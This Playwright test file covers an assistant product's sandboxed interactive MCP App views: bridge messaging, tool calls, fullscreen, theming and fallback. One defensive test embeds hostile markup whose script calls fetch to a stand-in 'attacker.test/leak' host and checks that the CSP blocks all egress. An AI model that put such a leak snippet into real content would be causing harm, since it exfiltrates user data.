import type { Page, Route } from '@playwright/test';

import {
  buildViewCsp,
  sandboxProxyDocument,
  sandboxResourceParams,
} from '@docket/integrations/mcp-apps';
import { MCP_UI_MIME_TYPE, MCP_UI_PROTOCOL_VERSION } from '@docket/types';

import { newUser, signUp } from '../helpers/app';
import { ORIGIN } from '../helpers/constants';
import { expect, test } from '../helpers/fixtures';

test.use({ serviceWorkers: 'block' });

const CREATED_AT = '2026-08-29T17:00:00.000Z';
const SESSION_ID = 'athena_mcp_apps_stable';
const CONNECTION_ID = 'connection-origin-only';

const LIVE_APP_HTML = `<!doctype html>
<html><head><meta charset="utf-8"><title>Stable MCP App</title></head>
<body data-theme="unknown">
  <p id="result">Waiting for Athena</p>
  <p id="tool-answer"></p>
  <button id="call" type="button">Run app-only action</button>
  <button id="message" type="button">Post text to Athena</button>
  <button id="link" type="button">Open safe link</button>
  <button id="fullscreen" type="button">Open fullscreen</button>
  <button id="teardown" type="button">Close interactive view</button>
  <script>
  (() => {
    let nextId = 10;
    const pending = new Map();
    const send = (message) => parent.postMessage(message, '*');
    const request = (method, params) => {
      const id = nextId++;
      send({ jsonrpc: '2.0', id, method, params });
      return new Promise((resolve) => pending.set(id, resolve));
    };
    window.addEventListener('message', (event) => {
      const message = event.data;
      if (!message || message.jsonrpc !== '2.0') return;
      if ('id' in message && !('method' in message)) {
        const resolve = pending.get(message.id);
        if (resolve) { pending.delete(message.id); resolve(message); }
        return;
      }
      if (message.method === 'ui/notifications/tool-result') {
        const block = message.params?.content?.find((candidate) => candidate.type === 'text');
        document.querySelector('#result').textContent = block?.text || 'No text result';
      }
      if (message.method === 'ui/notifications/host-context-changed') {
        if (message.params?.theme) document.body.dataset.theme = message.params.theme;
        if (message.params?.displayMode) document.body.dataset.mode = message.params.displayMode;
        if (message.params?.containerDimensions) {
          document.body.dataset.width = String(message.params.containerDimensions.maxWidth || message.params.containerDimensions.width || '');
        }
      }
      if (message.method === 'ui/resource-teardown' && 'id' in message) {
        document.body.dataset.tornDown = 'true';
        send({ jsonrpc: '2.0', id: message.id, result: {} });
      }
    });
    document.querySelector('#call').addEventListener('click', async () => {
      const answer = await request('tools/call', { name: 'app_only_action', arguments: { value: 7 } });
      const block = answer.result?.content?.find((candidate) => candidate.type === 'text');
      document.querySelector('#tool-answer').textContent = block?.text || 'No answer';
    });
    document.querySelector('#fullscreen').addEventListener('click', () => {
      void request('ui/request-display-mode', { mode: 'fullscreen' });
    });
    document.querySelector('#message').addEventListener('click', () => {
      void request('ui/message', { role: 'user', content: [{ type: 'text', text: 'Message from the app' }] });
    });
    document.querySelector('#link').addEventListener('click', () => {
      void request('ui/open-link', { url: 'https://example.test/from-app' });
    });
    document.querySelector('#teardown').addEventListener('click', () => {
      send({ jsonrpc: '2.0', method: 'ui/request-teardown', params: {} });
    });
    request('ui/initialize', {
      appInfo: { name: 'athena-e2e-app', version: '1.0.0' },
      appCapabilities: { availableDisplayModes: ['inline', 'fullscreen'] },
      protocolVersion: ${JSON.stringify(MCP_UI_PROTOCOL_VERSION)}
    }).then((answer) => {
      document.body.dataset.theme = answer.result?.hostContext?.theme || 'unknown';
      document.body.dataset.mode = answer.result?.hostContext?.displayMode || 'inline';
      send({ jsonrpc: '2.0', method: 'ui/notifications/initialized', params: {} });
      send({ jsonrpc: '2.0', method: 'ui/notifications/size-changed', params: { width: 420, height: 180 } });
    });
  })();
  </script>
</body></html>`;

const SILENT_APP_HTML = '<!doctype html><html><body><p>Never initializes</p></body></html>';

function presentation(html: string, tool = 'weather_card') {
  return {
    connectionId: CONNECTION_ID,
    serverName: tool === 'weather_card' ? 'Weather Service' : 'Broken Service',
    tool,
    arguments: { city: 'Las Vegas' },
    result: {
      content: [
        { type: 'text', text: tool === 'weather_card' ? '72 degrees' : 'Fallback survived' },
      ],
      isError: false,
    },
    resource: {
      uri: `ui://weather/${tool}`,
      mimeType: MCP_UI_MIME_TYPE,
      text: html,
      meta: { prefersBorder: true, permissions: { clipboardWrite: {} } },
    },
  } as const;
}

function sessionDetail(orgId: string, withPresentation: boolean) {
  const session = {
    id: SESSION_ID,
    kind: 'job',
    status: 'running',
    queueState: 'working',
    objective: 'Show the stable MCP Apps journey',
    context: { workspaceId: orgId },
    workspace: { id: orgId, name: 'Personal workspace' },
    startedAt: CREATED_AT,
    endedAt: null,
    createdAt: CREATED_AT,
  } as const;
  return {
    ...session,
    activities: withPresentation
      ? [
          {
            id: 'model_tool_live',
            sessionId: SESSION_ID,
            type: 'action',
            body: {
              action: {
                summary: 'Show Las Vegas weather',
                toolCall: {
                  connection: 'weather-service',
                  tool: 'weather_card',
                  input: { city: 'Las Vegas' },
                },
                result: { content: '72 degrees', presentation: presentation(LIVE_APP_HTML) },
              },
            },
            createdAt: CREATED_AT,
          },
          {
            id: 'model_tool_broken',
            sessionId: SESSION_ID,
            type: 'action',
            body: {
              action: {
                summary: 'Show fallback weather',
                toolCall: { connection: 'broken-service', tool: 'broken_card', input: {} },
                result: {
                  content: 'Fallback survived',
                  presentation: presentation(SILENT_APP_HTML, 'broken_card'),
                },
              },
            },
            createdAt: CREATED_AT,
          },
        ]
      : [],
    result: null,
  } as const;
}

/** Install deterministic canonical-Athena responses while the real React/iframe host runs. */
async function installAthenaMcpFixture(page: Page, orgId: string) {
  let modelInvocationCount = 0;
  let originalToolRouteCount = 0;
  let persisted = false;
  const viewCalls: unknown[] = [];
  const appMessages: unknown[] = [];
  const summary = sessionDetail(orgId, false);

  await page.route('**/mcp/apps/sandbox', async (route) => {
    const hostOrigin = new URL(page.url()).origin;
    await route.fulfill({
      status: 200,
      contentType: 'text/html; charset=utf-8',
      headers: {
        'Content-Security-Policy': `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; frame-src 'self' data:; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors ${hostOrigin}`,
      },
      body: sandboxProxyDocument(hostOrigin),
    });
  });

  await page.route('**/v1/me/athena**', async (route: Route) => {
    const request = route.request();
    const path = new URL(request.url()).pathname;
    if (request.method() === 'GET' && path === '/v1/me/athena/pulse') {
      await route.fulfill({ json: { needsYou: 0, working: 1 } });
      return;
    }
    if (request.method() === 'GET' && path === '/v1/me/athena') {
      await route.fulfill({
        json: {
          counts: { needsYou: 0, working: 1, finished: 0 },
          currentChat: null,
          sessions: { needsYou: [], working: [summary], finished: [] },
        },
      });
      return;
    }
    if (request.method() === 'GET' && path === `/v1/me/athena/sessions/${SESSION_ID}`) {
      await route.fulfill({ json: sessionDetail(orgId, persisted) });
      return;
    }
    if (request.method() === 'POST' && path === `/v1/me/athena/sessions/${SESSION_ID}/messages`) {
      modelInvocationCount += 1;
      persisted = true;
      await route.fulfill({ json: sessionDetail(orgId, true) });
      return;
    }
    if (request.method() === 'POST' && path === '/v1/me/athena/mcp-apps/call') {
      originalToolRouteCount += 1;
      await route.fulfill({ status: 500, json: {} });
      return;
    }
    if (request.method() === 'POST' && path === '/v1/me/athena/mcp-apps/view-call') {
      const body: unknown = request.postDataJSON();
      viewCalls.push(body);
      await route.fulfill({
        json: {
          connectionId: CONNECTION_ID,
          tool: 'app_only_action',
          resource: null,
          arguments: { value: 7 },
          result: { content: [{ type: 'text', text: 'Scoped app action complete' }] },
        },
      });
      return;
    }
    if (request.method() === 'POST' && path === '/v1/me/athena/chat/messages') {
      appMessages.push(request.postDataJSON());
      await route.fulfill({ json: { id: SESSION_ID } });
      return;
    }
    if (request.method() === 'GET' && path === '/v1/me/athena/mcp-apps/widgets') {
      await route.fulfill({ json: [] });
      return;
    }
    await route.fulfill({ status: 404, json: {} });
  });

  return {
    modelInvocationCount: () => modelInvocationCount,
    originalToolRouteCount: () => originalToolRouteCount,
    viewCalls,
    appMessages,
  };
}

function appFrame(page: Page) {
  const proxy = page.locator('iframe[title="Weather Service: weather_card"]').contentFrame();
  return proxy.locator('iframe').contentFrame();
}

/** Route same-origin auth to this worktree's real API when the dev rewrite is unavailable. */
async function installDirectAuthProxy(page: Page): Promise<void> {
  const apiOrigin = process.env['API_URL'];
  if (!apiOrigin)
    throw new Error('API_URL is required; run with eval "$(./scripts/dev-stack.sh env)"');
  await page.route('**/api/auth/**', async (route) => {
    const source = new URL(route.request().url());
    const target = new URL(`${source.pathname}${source.search}`, apiOrigin);
    const response = await route.fetch({
      url: target.href,
      headers: { ...route.request().headers(), origin: ORIGIN },
    });
    await route.fulfill({ response });
  });
  await page.route('**/v1/**', async (route) => {
    const source = new URL(route.request().url());
    const target = new URL(`${source.pathname}${source.search}`, apiOrigin);
    const response = await route.fetch({ url: target.href });
    await route.fulfill({ response });
  });
}

/** Finish real auth even when Playwright's fulfilled response leaves its cookie host-only. */
async function authenticateAndOnboard(page: Page): Promise<string> {
  const apiOrigin = process.env['API_URL'];
  if (!apiOrigin) throw new Error('API_URL is required');
  const user = newUser('mcp-apps-stable');
  try {
    await signUp(page, user);
  } catch (signUpFailure) {
    const cookies = await page.context().cookies();
    const cookieHeader = cookies.map((cookie) => `${cookie.name}=${cookie.value}`).join('; ');
    const sessionResponse = await page.request.get(`${apiOrigin}/api/auth/get-session`, {
      headers: { cookie: cookieHeader, origin: ORIGIN },
    });
    const session: unknown = await sessionResponse.json().catch(() => null);
    if (
      typeof session !== 'object' ||
      session === null ||
      typeof Reflect.get(session, 'user') !== 'object'
    ) {
      throw new Error(
        `Real auth did not create a session after verification (${sessionResponse.status()}): ${String(signUpFailure)}`,
        { cause: signUpFailure },
      );
    }
    await page.context().addCookies(
      cookies.map((cookie) => ({
        name: cookie.name,
        value: cookie.value,
        domain: '.docket.localhost',
        path: cookie.path,
        httpOnly: cookie.httpOnly,
        secure: cookie.secure,
        sameSite: cookie.sameSite,
        expires: cookie.expires,
      })),
    );
  }

  await page.goto('/onboarding');
  const orgResponse = page.waitForResponse(
    (response) =>
      new URL(response.url()).pathname === '/v1/orgs' && response.request().method() === 'POST',
  );
  await page.getByText('Just me', { exact: false }).first().click();
  await page.getByRole('button', { name: 'Skip for now' }).click();
  const body: unknown = await (await orgResponse).json();
  const organization =
    typeof body === 'object' && body !== null ? Reflect.get(body, 'organization') : null;
  const orgId =
    typeof organization === 'object' && organization !== null
      ? Reflect.get(organization, 'id')
      : null;
  if (typeof orgId !== 'string') throw new Error('Real onboarding returned no organization id');
  return orgId;
}

test('canonical Athena invocation creates and restores a fully interactive stable MCP App', async ({
  page,
}) => {
  await installDirectAuthProxy(page);
  const orgId = await authenticateAndOnboard(page);
  const fixture = await installAthenaMcpFixture(page, orgId);
  await page.goto(`/athena?session=${SESSION_ID}`);

  await expect(page.getByTestId('mcp-app-view')).toHaveCount(0);
  const composer = page.getByRole('combobox', { name: 'Steer this work' });
  await composer.fill('Show me the interactive weather card.');
  await page
    .getByRole('form', { name: 'Steer Athena' })
    .getByRole('button', { name: 'Send' })
    .click();

  await expect(page.getByText('Weather Service · Show Las Vegas weather')).toBeVisible();
  await expect(page.getByText('72 degrees', { exact: true })).toBeVisible();
  await expect(appFrame(page).locator('#result')).toHaveText('72 degrees');
  const proxyFrame = page.locator('iframe[title="Weather Service: weather_card"]').contentFrame();
  await expect(proxyFrame.locator('iframe')).toHaveAttribute('sandbox', 'allow-scripts');
  await expect(proxyFrame.locator('iframe')).toHaveAttribute('allow', "clipboard-write 'src'");
  expect(fixture.modelInvocationCount()).toBe(1);
  expect(fixture.originalToolRouteCount()).toBe(0);

  // A surrounding composer rerender must not teardown/reinitialize the already-live bridge.
  await composer.fill('This draft should not disturb the card.');
  await appFrame(page).getByRole('button', { name: 'Run app-only action' }).click();
  await expect(appFrame(page).locator('#tool-answer')).toHaveText('Scoped app action complete');
  expect(fixture.viewCalls).toEqual([
    { connectionId: CONNECTION_ID, tool: 'app_only_action', arguments: { value: 7 } },
  ]);

  await appFrame(page).getByRole('button', { name: 'Post text to Athena' }).click();
  await expect.poll(() => fixture.appMessages).toEqual([{ body: 'Message from the app' }]);

  const popupPromise = page.waitForEvent('popup');
  await appFrame(page).getByRole('button', { name: 'Open safe link' }).click();
  const popup = await popupPromise;
  await expect(popup).toHaveURL('https://example.test/from-app');
  await popup.close();

  await expect(page.locator('iframe[title="Weather Service: weather_card"]')).toHaveCSS(
    'height',
    '180px',
  );
  const wideWidth = await appFrame(page).locator('body').getAttribute('data-width');
  await page.setViewportSize({ width: 720, height: 800 });
  await expect(page.getByTestId('mcp-app-view').first()).toBeVisible();
  await expect
    .poll(() => appFrame(page).locator('body').getAttribute('data-width'))
    .not.toBe(wideWidth);
  await page.setViewportSize({ width: 1440, height: 900 });

  await page.evaluate(() => {
    document.documentElement.dataset['theme'] = 'dark';
  });
  await expect(appFrame(page).locator('body')).toHaveAttribute('data-theme', 'dark');

  await appFrame(page).getByRole('button', { name: 'Open fullscreen' }).click();
  await expect(page.getByRole('dialog', { name: 'Weather Service: weather_card' })).toBeVisible();
  await page.evaluate(() => {
    const outside = document.createElement('button');
    outside.id = 'mcp-outside-focus';
    outside.textContent = 'Outside';
    document.body.append(outside);
    outside.focus();
  });
  await expect(page.getByRole('button', { name: 'Close' })).toBeFocused();
  await page.getByRole('button', { name: 'Close' }).click();

  // The failed app retains the safe text and reaches owned fallback rather than a blank card.
  await expect(page.getByText('Fallback survived', { exact: true })).toBeVisible();
  await expect(page.getByTestId('mcp-app-view-failure')).toContainText(
    'Interactive view unavailable.',
    {
      timeout: 8_000,
    },
  );

  await page.reload();
  await expect(appFrame(page).locator('#result')).toHaveText('72 degrees');
  expect(fixture.modelInvocationCount()).toBe(1);
  expect(fixture.originalToolRouteCount()).toBe(0);

  await appFrame(page).getByRole('button', { name: 'Close interactive view' }).click();
  await expect(page.locator('iframe[title="Weather Service: weather_card"]')).toHaveCount(0);
});

test('host CSP is installed before hostile executable markup and permits zero egress', async ({
  page,
}) => {
  const attempted: string[] = [];
  await page.route('https://attacker.test/**', async (route) => {
    attempted.push(route.request().url());
    await route.abort();
  });
  const params = sandboxResourceParams({
    uri: 'ui://hostile/late-head',
    mimeType: MCP_UI_MIME_TYPE,
    text: '<html><script>fetch("https://attacker.test/leak")</script><head><title>late</title></head><body>safe</body></html>',
  });
  expect(buildViewCsp()).toContain(`connect-src 'none'`);

  await page.setContent('<iframe sandbox="allow-scripts"></iframe>');
  await page.locator('iframe').evaluate((frame, html) => {
    frame.setAttribute('srcdoc', String(html));
  }, params['html']);
  await page.waitForTimeout(500);

  expect(attempted).toEqual([]);
});

test('host CSP normalization preserves standards mode for provider documents', async ({ page }) => {
  const params = sandboxResourceParams({
    uri: 'ui://standards/document',
    mimeType: MCP_UI_MIME_TYPE,
    text: '<!doctype html><html><head><title>standards</title></head><body>safe</body></html>',
  });

  await page.goto(`data:text/html;charset=utf-8,${encodeURIComponent(String(params['html']))}`);
  expect(await page.evaluate(() => document.compatMode)).toBe('CSS1Compat');
});
